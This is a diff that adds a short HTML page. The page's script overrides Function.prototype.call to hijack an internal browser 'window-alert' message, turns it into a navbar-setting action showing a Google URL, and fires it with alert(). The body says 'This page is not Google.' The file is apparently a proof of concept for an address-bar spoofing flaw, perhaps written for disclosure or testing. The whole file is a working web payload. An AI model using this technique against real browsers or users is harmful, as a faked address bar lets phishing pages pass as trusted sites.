@@ -1,0 +1,13 @@
+<script>
+window.onload=function(){
+	Function.prototype.call=function(e){
+		if(e && e[0] && e[0]=="window-alert"){
+			e[0]="dispatch-action";
+			e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/csi"}';
+		}
+		return this.apply(e);
+	}
+	alert();
+}
+</script>
+<h1>This page is not Google.</h1>
